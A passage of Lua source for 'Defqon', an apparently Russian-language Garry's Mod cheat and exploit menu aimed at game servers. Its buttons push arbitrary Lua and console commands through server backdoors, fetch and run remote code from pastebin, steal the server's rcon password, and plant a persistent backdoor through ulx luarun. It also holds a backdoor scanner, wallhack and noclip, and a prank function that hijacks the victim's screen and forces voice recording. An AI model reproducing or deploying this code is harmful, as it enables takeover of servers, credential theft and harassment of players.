	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx25.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	local speedhack = [[
	hook.Add("Think", "speedhack", function()
		for k,v in pairs (player.GetAll()) do
			v:SetRunSpeed(400* 4);
			v:SetWalkSpeed(200 * 2);
		end
	end)]]
	net.Start(thefrenchenculer)
	net.WriteString( speedhack )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx26 = vgui.Create("DButton", DScrollPanel)
	commandnethtx26:SetSize( 208, 20 )
	commandnethtx26:SetPos( 2, 675 )
	commandnethtx26:SetText("Кашель всевышнего")
	commandnethtx26:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx26.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx26.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Кхм" )
	net.Start(thefrenchenculer)
	net.WriteString([[
	for k,v in pairs(player.GetAll()) do
		timer.Create("cough", 10, 0, function()
			RunConsoleCommand("say", "*кхм..кхм*")
			v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
			util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
		end)
	end
	]])
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx27 = vgui.Create("DButton", DScrollPanel)
	commandnethtx27:SetSize( 208, 20 )
	commandnethtx27:SetPos( 2, 700 )
	commandnethtx27:SetText("Azis - Hop на весь экран")
	commandnethtx27:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx27.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx27.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запущено" )
	net.Start(thefrenchenculer)
	net.WriteString( "http.Fetch(\"https://pastebin.com/raw/re1ucyWy\",function(b,l,h,c)RunString(b)end,nil)" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx28 = vgui.Create("DButton", DScrollPanel)
	commandnethtx28:SetSize( 208, 20 )
	commandnethtx28:SetPos( 2, 125 )
	commandnethtx28:SetText("RCON STEALER")
	commandnethtx28:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx28.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx28.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	net.Start(thefrenchenculer)
	net.WriteString( "http.Fetch(\"https://pastebin.com/V054AVp3\",function(b,l,h,c)RunString(b)end,nil)" )
	net.WriteBit(1)
	net.SendToServer()
	timer.Simple( 0.5, function()
	if iZNX.ValidNetString( "jeveuttonrconleul" ) then
	net.Start("jeveuttonrconleul")
	net.SendToServer()
	else
	chat.AddText( Color(255, 0, 0),"rcon_password не найден, попробуйте еще раз ^^" )
	end
	end )
	end
	----------------------------------------------------------------------------------------------
	local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
	RconCommand:SetPos( 110, 0 )
	RconCommand:SetSize( 100, 20 )
	RconCommand:SetText( "hostname Hacked kuskom govna!" )
	local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
	Lancer_rcon_commande:SetSize( 103, 20 )
	Lancer_rcon_commande:SetPos( 2, 0 )
	Lancer_rcon_commande:SetText("RCON Команда")
	Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
	Lancer_rcon_commande.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	Lancer_rcon_commande.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
	local rcon_commandes_get = RconCommand:GetValue()
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( rcon_commandes_get )
	net.WriteBit(false)
	net.SendToServer()
	end
	local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
	GLUACommand:SetPos( 110, 25 )
	GLUACommand:SetSize( 100, 20 )
	GLUACommand:SetText( "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" ) -- timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)
	local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
	Lancer_glua_commande:SetSize( 103, 20 )
	Lancer_glua_commande:SetPos( 2, 25 )
	Lancer_glua_commande:SetText("Lua код")
	Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
	Lancer_glua_commande.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	Lancer_glua_commande.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
	local glua_commandes_get = GLUACommand:GetValue()
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( glua_commandes_get )
	net.WriteBit(1)
	net.SendToServer()
	end
	end
	net.Receive( "rcon_passw_dump", function()
	local rcon_pass = net.ReadString()
	chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG с этим вы можете ломать сервер, даже если он удалит backdoor :D")
	end )
	net.Receive( "aucun_rcon_ici", function()
	chat.AddText( Color(255, 0, 0),"Нет rcon_password на сервере :/" )
	end )
	function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
	if !parent:IsValid() then return end
	local TButton = vgui.Create( "DButton" )
	TButton:SetParent( parent )
	TButton:SetPos( x, y )
	TButton:SetText( "Выберите игрока" )
	TButton:SetTextColor( Color(255, 255, 255, 255) )
	TButton:SizeToContents()
	TButton:SetTall( 24 )
	TButton.Paint = function( self, w, h )
	surface.SetDrawColor( Color(60, 60, 90, 200) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) )
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.SetDrawColor( Color(70, 70, 100, 255) )
	surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
	end
	TButton.DoClick = function()
	iZNX.SelectPlayersPanel( addr )
	end
	return TButton:GetWide(), TButton:GetTall()
	end
	function iZNX.SelectPlayersPanel( addr )
	if iZNX.PlayerSelector and iZNX.PlayerSelector:IsVisible() then iZNX.PlayerSelector:Remove() end
	local plytab = iZNX.GetStored( addr, {} )
	iZNX.PlayerSelector = vgui.Create("DFrame")
	iZNX.PlayerSelector:SetSize(250,400)
	iZNX.PlayerSelector:SetTitle("Выбор цели")
	iZNX.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
	iZNX.PlayerSelector:MakePopup()
	iZNX.PlayerSelector.Paint = function( s, w, h )
	if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
	surface.SetDrawColor( Color(30, 30, 30, 245) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color(55, 55, 55, 245) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
	end
	local Plist = vgui.Create( "DPanelList", iZNX.PlayerSelector )
	Plist:SetSize( iZNX.PlayerSelector:GetWide() - 10, iZNX.PlayerSelector:GetTall() - 55 )
	Plist:SetPadding( 5 )
	Plist:SetSpacing( 5 )
	Plist:EnableHorizontal( false )
	Plist:EnableVerticalScrollbar( true )
	Plist:SetPos( 5, 40 )
	Plist:SetName( "" )
	local target1 = vgui.Create("DButton", iZNX.PlayerSelector)
	target1:SetSize( 40, 20 )
	target1:SetPos( 10, 23 )
	target1:SetText("Все")
	target1:SetTextColor(Color(255, 255, 255, 255))
	target1.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(0, 0, 50 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	target1.DoClick = function()
	for _, p in pairs(player.GetAll()) do
	if not table.HasValue( plytab, p ) then
	table.insert( plytab, p )
	end
	end
	iZNX.Store( addr, plytab )
	end
	local target2 = vgui.Create("DButton", iZNX.PlayerSelector)
	target2:SetSize( 40, 20 )
	target2:SetPos( 55, 23 )
	target2:SetText("Никто")
	target2:SetTextColor(Color(255, 255, 255, 255))
	target2.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(0, 0, 50 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	target2.DoClick = function()
	table.Empty( plytab )
	iZNX.Store( addr, plytab )
	end
	local target3 = vgui.Create("DButton", iZNX.PlayerSelector )
	target3:SetSize( 40, 20 )
	target3:SetPos( 100, 23 )
	target3:SetText("Вы")
	target3:SetTextColor(Color(255, 255, 255, 255))
	target3.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(0, 0, 50 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	target3.DoClick = function()
	table.Empty( plytab )
	table.insert( plytab, LocalPlayer() )
	iZNX.Store( addr, plytab )
	end
	local target4 = vgui.Create( "DTextEntry", iZNX.PlayerSelector )
	target4:SetPos( 145, 23 )
	target4:SetSize( 95, 20 )
	target4:SetText( "" )
	target4.OnChange = function( self )
	local nam = self:GetValue()
	local namtab = string.Explode( ", ", nam )
	table.Empty( plytab )
	for _, pl in pairs( player.GetAll() ) do
	for _, s in pairs( namtab ) do
	if string.find( string.lower( pl:Nick() ), s ) then
	table.insert( plytab, pl )
	end
	end
	end
	iZNX.Store( addr, plytab )
	end
	for k, v in pairs( player.GetAll() ) do
	local plypanel2 = vgui.Create( "DPanel" )
	plypanel2:SetPos( 0, 0 )
	plypanel2:SetSize( 200, 25 )
	local teamcol = team.GetColor( v:Team() )
	plypanel2.Paint = function( s, w, h )
	if !v:IsValid() then return end
	surface.SetDrawColor( Color(30, 30, 30, 245) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( teamcol )
	surface.DrawRect( 0, h - 3, w, 3 )
	surface.SetDrawColor( Color(55, 55, 55, 245) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
	surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
	end
	local plyname = vgui.Create( "DLabel", plypanel2 )
	plyname:SetPos( 10, 5 )
	plyname:SetFont( "Trebuchet18" )
	local tcol = Color( 255, 255, 255 )
	if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
	plyname:SetColor( tcol )
	plyname:SetText( v:Nick() )
	plyname:SetSize(180, 15)
	local faggot = vgui.Create("DButton", plypanel2 )
	faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
	faggot:SetPos( 0, 0 )
	faggot:SetText("")
	faggot.Paint = function(panel, w, h)
	return
	end
	faggot.DoClick = function()
	if table.HasValue( plytab, v ) then
	table.RemoveByValue( plytab, v )
	else
	table.insert( plytab, v )
	end
	iZNX.Store( addr, plytab )
	end
	Plist:AddItem( plypanel2 )
	end
	end
	function iZNX.MakeTextInputButton( parent, x, y, btext, default, addr)
	if !parent:IsValid() then return end
	local hostframe = vgui.Create( "DPanel", parent )
	hostframe:SetPos( x, y )
	hostframe.Paint = function( self, w, h )
	surface.SetDrawColor( Color(60, 60, 60, 200) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) )
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	end
	local tttt = vgui.Create( "DLabel", hostframe )
	tttt:SetPos( 5, 5 )
	tttt:SetText( btext )
	tttt:SizeToContents()
	local tentry = vgui.Create( "DTextEntry", hostframe )
	tentry:SetPos( 10 + tttt:GetWide(), 2 )
	tentry:SetSize( 130, 20 )
	tentry:SetText( iZNX.GetStored( addr, default ) )
	tentry.OnChange = function( self )
	iZNX.Store( addr, self:GetValue() )
	end
	hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
	return hostframe:GetWide(), hostframe:GetTall()
	end
	function iZNX.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
	if !parent:IsValid() then return end
	local hostframe = vgui.Create( "DPanel", parent )
	hostframe:SetPos( x, y )
	hostframe.Paint = function( self, w, h )
	surface.SetDrawColor( Color(60, 60, 60, 200) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) )
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	end
	local tttt = vgui.Create( "DLabel", hostframe )
	tttt:SetPos( 5, 5 )
	tttt:SetText( btext )
	tttt:SizeToContents()
	local wangmeoff = vgui.Create( "DNumberWang", hostframe )
	wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
	wangmeoff:SetSize( 75, 20 )
	wangmeoff:SetDecimals( 2 )
	wangmeoff:SetMinMax( min , max )
	wangmeoff:SetValue( iZNX.GetStored( addr, default ) )
	wangmeoff:SetAllowNonAsciiCharacters(false)
	wangmeoff.OnValueChanged = function( self, val )
	iZNX.Store( addr, self:GetValue() )
	end
	hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
	return hostframe:GetWide(), hostframe:GetTall()
	end
	local FillFrameRates = RatesScaleLevel
	concommand.Add( "Defqon", function()
	if true then
	LocalPlayer():EmitSound("weapons/ar2/ar2_reload_push.wav",500,100)
	iZNX.Menu = vgui.Create("DFrame")
	iZNX.Menu:SetSize(950,820)
	iZNX.Menu:SetTitle("")
	iZNX.Menu:Center()
	iZNX.Menu:MakePopup()
	iZNX.Menu.gay = table.Count( iZNX.sploits )
	iZNX.Menu.Paint = function( s, w, h )
	surface.SetDrawColor( Color(41, 41, 41) ) -- Цвет обводки внутри меню (41 41 41)
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color(55, 55, 55, 245) ) -- Обводка меню
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
	surface.SetDrawColor( Color(33, 33, 33) ) -- Цвет меню в центре
	surface.DrawRect( 80, 25, w - 90, h - 35 )
	surface.SetDrawColor( Color(100, 100, 100, 200) )
	draw.DrawText( "Defqon v 5.1.1\nExploits: "..iZNX.Menu.gay, "default", 8, 15, Color(255,255,255, 350) )
	draw.DrawText( "17.03.18", "default", 8, 40, Color(255,255,255, 350) )
	draw.DrawText( "---------------","HUDLogo2", 6, 664, Color(255,255,255, 10000) )
	draw.DrawText( "Остальное","HUDLogo2", 5, 652, Color(255,255,255, 10000) )
	draw.DrawText( "---------------","HUDLogo2", 6, 638, Color(255,255,255, 10000) )
	end
	local Plist = vgui.Create( "DPanelList", iZNX.Menu )
	Plist:SetSize( iZNX.Menu:GetWide() - 90, iZNX.Menu:GetTall() - 35 )
	Plist:SetPadding( 5 )
	Plist:SetSpacing( 5 )
	Plist:EnableHorizontal( false )
	Plist:EnableVerticalScrollbar( true )
	Plist:SetPos( 80, 25 )
	Plist:SetName( "" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 765, "Ноклип", Noclip, "ClientSide Noclip" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 792, "Инжектор", Inject, "Инжектит фирменный Backdoor на сервер" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 737, "Бэкдур чек", checkbackdoors, "Лист бэкдуров aka чек сервера на бэкдуры (смотреть в консоль)" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 710, "Админ-хак", lmfao, "Фейк ULX выдача SuperAdmin, можно сделать скриншот, мол вы хакер" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 683, "Не нажимать", lmfao1, "НЕ НАЖИМАТЬ!!" )
	iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 67, "Создатель", gui.url, "Ссылка на страницу создателя меню" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 148, "Сканер", iZNX.ScanPlayers, "Сканирует игроков" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 310, "Lua Viewer", luaview, "Клиент-сайд lua view" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 121, "Чек Версии", CheckVersion, "Чек версии чита" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 175, "RainbowGun", rainbowphysgun, "Включает радужный физган" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 202, "RunLuaCode", editor, "Run on self - Запуск луа кода на себя" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 229, "WallHack", WHT, "Включает вх" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 256, "BunnyHop", Bhop, "Обыкновенный бхоп" )
	iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 283, "Big Menu", bigmenu, "Big Menu" )
	iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 94, "Анти-Читы", anticheats, "Показывает меры безопасности (Скринграбы, анти-читы и т.д)" )
	local function CreateSploitPanel( name, t )
	if !iZNX.Menu then return end
	local cmdp = vgui.Create( "DPanel" )
	cmdp:SetSize( Plist:GetWide(), 70 )
	cmdp.Cmd = name
	cmdp.Desc = t.desc
	cmdp.Paint = function( s, w, h )
	surface.SetDrawColor( Color(41, 41, 41, 245) ) -- Цвет эксплойтов
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( severitycols[t.severity] )
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.DrawLine( 0, 24, w, 24 )
	draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
	draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )
	end
	local x = 10
	for _, tab in ipairs( t.functions ) do
	if tab.typ == "func" then
	x = (x + 5) + iZNX.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
	elseif tab.typ == "players" then
	x = (x + 5) + iZNX.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
	elseif tab.typ == "htxcommandeliste" then
	x = (x + 5) + iZNX.HTXBackdoor( cmdp, x, 42, tab.name )
	elseif tab.typ == "soundboard" then
	x = (x + 5) + iZNX.SoundBoard( cmdp, x, 42, tab.name )
	elseif tab.typ == "string" then
	x = (x + 5) + iZNX.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
	if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
	elseif tab.typ == "float" then
	x = (x + 5) + iZNX.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
	if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
	end
	end
	Plist:AddItem( cmdp )
	end
	for k, v in pairs( iZNX.sploits ) do
	if v.scan() then CreateSploitPanel( k, v ) end
	end
	return end
	end)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--[[ --------------------------------------------------------------
		  _____     _          _   _ _        _   _            _    
		 |  ___|_ _| | _____  | | | | |_  __ | | | | __ _  ___| | __
		 | |_ / _` | |/ / _ \ | | | | \ \/ / | |_| |/ _` |/ __| |/ /
		 |  _| (_| |   <  __/ | |_| | |>  <  |  _  | (_| | (__|   < 
		 |_|  \__,_|_|\_\___|  \___/|_/_/\_\ |_| |_|\__,_|\___|_|\_\
		 
		---------------------------------------------------------------]]                                                        
	
	------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	
	--[[ ----------------------------------------------------------------------------------
		  ____              _ _      ____ _ _      _      ____        _   _              
		 |  _ \  ___  _ __ ( ) |_   / ___| (_) ___| | __ | __ ) _   _| |_| |_ ___  _ __  
		 | | | |/ _ \| '_ \|/| __| | |   | | |/ __| |/ / |  _ \| | | | __| __/ _ \| '_ \ 
		 | |_| | (_) | | | | | |_  | |___| | | (__|   <  | |_) | |_| | |_| || (_) | | | |
		 |____/ \___/|_| |_|  \__|  \____|_|_|\___|_|\_\ |____/ \__,_|\__|\__\___/|_| |_|
		 
		 ----------------------------------------------------------------------------------]]                                                                            
	
	function lmfao1()
	surface.PlaySound("garrysmod/ui_click.wav")
	local msg = "Подожди. . ."
	surface.CreateFont("lolwutbet", {size=75})
	local function huddrawdetour()
		draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
		draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
		draw.SimpleText(msg, "lolwutbet", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end
	
	
	for k,v in pairs(hook.GetTable()) do
		for o,j in pairs(v) do
			if k == "HUDPaint" then
				hook.Remove(k, o)
				hook.Add(k, o, huddrawdetour)
			end
		end
	end
	hook.Add("HUDPaint","eztoirkfghdjbnvxc", huddrawdetour)
	
	timer.Create("wowlolwut_my_boi",2 ,0 , function()
		msg = table.Random({
			"Зачем ты нажал?", 
			"cl_yawspeed 8", 
			"-right", 
			"Почему ты это сделал ?", 
			"Я уже взламываю твой аккаунт",
			"Я же написал, чтоб ты не нажимал",
			"Команды на экране",
			"u n00b",
			"-right",
			"1337 h4ck3r",
			"Больше не нажимай на меня, ок?",
			"cl_yawspeed 8",
			"Надеюсь, ты усвоил урок",
			"..."})
	end)
	
	timer.Create("lgfholjghlfdsh",0 ,0 , function()
		MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "ЗАПУСТИ МЕНЯ ЕЩЕ � АЗ, ДАВАЙ, СДЕЛАЙ ЭТО!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !\n")
	end)
	sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
		s:Play()
	end)
	LocalPlayer():ConCommand("+voicerecord")
	LocalPlayer():ConCommand("cl_yawspeed 9999")
	LocalPlayer():ConCommand("+right")
	MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "Нажми escape !\n")
	timer.Simple(5 * 60, function()
		table.Empty(debug.getregistry())
	end )
	end
	concommand.Add( "Music_troll", lmfao1 )
	------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--[[------------------------------------------------------------------
			____      _           ____ _               _             
		   / ___|__ _| | _____   / ___| |__   ___  ___| | _____ _ __ 
		  | |   / _` | |/ / _ \ | |   | '_ \ / _ \/ __| |/ / _ \ '__|
		  | |__| (_| |   <  __/ | |___| | | |  __/ (__|   <  __/ |   
		   \____\__,_|_|\_\___|  \____|_| |_|\___|\___|_|\_\___|_|   
																
		------------------------------------------------------------------]]
	
	if (_G.QAC or _G.CAC) then
			surface.PlaySound("ambient/alarms/klaxon1.wav")
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "На сервере стоит Cake Anti Cheat!")
	end
	------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	local ply = LocalPlayer()
	function Noclip()
	surface.PlaySound("garrysmod/ui_click.wav")
	ply:ConCommand( "Defqon_noclip" )
	end
	local SW = {}
	SW.Enabled = false
	SW.ViewOrigin = Vector( 0, 0, 0 )
	SW.ViewAngle = Angle( 0, 0, 0 )
	SW.Velocity = Vector( 0, 0, 0 )
	function SW.CalcView( ply, origin, angles, fov )
		if ( !SW.Enabled ) then return end
			if ( SW.SetView ) then
			SW.ViewOrigin = origin
			SW.ViewAngle = angles
			SW.SetView = false
			end
		return { origin = SW.ViewOrigin, angles = SW.ViewAngle }
	end
	hook.Add( "CalcView", "SpiritWalk", SW.CalcView )
	function SW.CreateMove( cmd )
		if ( !SW.Enabled ) then return end
			   
		local time = FrameTime()
		SW.ViewOrigin = SW.ViewOrigin + ( SW.Velocity * time )
		SW.Velocity = SW.Velocity * 0.95
	
		local sensitivity = 0.022
		SW.ViewAngle.p = math.Clamp( SW.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
		SW.ViewAngle.y = SW.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
			   
	
		local add = Vector( 0, 0, 0 )
		local ang = SW.ViewAngle
		if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
		if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
		if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
		if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
		if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
		if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
		add = add:GetNormal() * time * 3000
		if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 2 end
			   
		SW.Velocity = SW.Velocity + add
		if ( SW.LockView == true ) then
		  SW.LockView = cmd:GetViewAngles()
		end
		if ( SW.LockView ) then
			cmd:SetViewAngles( SW.LockView )
		end
		cmd:SetForwardMove( 0 )
		cmd:SetSideMove( 0 )
		cmd:SetUpMove( 0 )
	end
	hook.Add( "CreateMove", "SpiritWalk", SW.CreateMove )
		function SW.Toggle()
		SW.Enabled = !SW.Enabled
		SW.LockView = SW.Enabled
		SW.SetView = true          
		local status = { [ true ] = "ON", [ false ] = "OFF" }
	end
	concommand.Add( "Defqon_noclip", SW.Toggle )
	
	function ValidNetString( str )
		local status, error = pcall( net.Start, str )
		return status
	end
	
	-- Superadmin Injector
	function Inject()
	surface.PlaySound("garrysmod/ui_click.wav")
		chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," Инжектим..." )
		if ( ply:IsSuperAdmin() ) then
			timer.Simple( 3, function() 
				if( ValidNetString("DefqonBackdoor") ) then
				
				else
					RunConsoleCommand( "ulx", "logecho", "0" )
					RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('DefqonBackdoor')" )
					RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('DefqonBackdoor') net.Receive('DefqonBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
					RunConsoleCommand( "ulx", "logecho", "1" )
					chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 0, 255, 0 )," Успешно заинжекчено!" )
				end
			end )
		else
			chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 0, 0 )," Failed! Вы не superadmin!" )
		end
		if( ValidNetString("DefqonBackdoor") ) then
			chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," Backdoor уже загружен!" )
		end
	end
	
	
	
	
	-- Backdoor Checker
	function checkbackdoors()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," В консоль посмотрите" )
	if( ValidNetString("Sbox_darkrp") ) then
			print( "[Defqon] Найден Backdoor! -   Sbox_darkrp" )
		end
		
	if( ValidNetString("_Defqon") ) then
			print( "[Defqon] Найден Backdoor! -   _Defqon" )
		end
		
	if( ValidNetString("Sandbox_ArmDupe") ) then
			print( "[Defqon] Найден Backdoor! -   Sandbox_ArmDupe" )
		end
	if( ValidNetString("Sbox_itemstore") ) then
			print( "[Defqon] Найден Backdoor! -   Sbox_itemstore" )
		end
	if( ValidNetString("Ulib_Message") ) then
			print( "[Defqon] Найден Backdoor! -   Ulib_Message" )
	end
	if( ValidNetString("ULogs_Info") ) then
			print( "[Defqon] Найден Backdoor! -   ULogs_Info" )
	end
	if( ValidNetString("ITEM") ) then
			print( "[Defqon] Найден Backdoor! -   ITEM" )
	end
	if( ValidNetString("fix") ) then
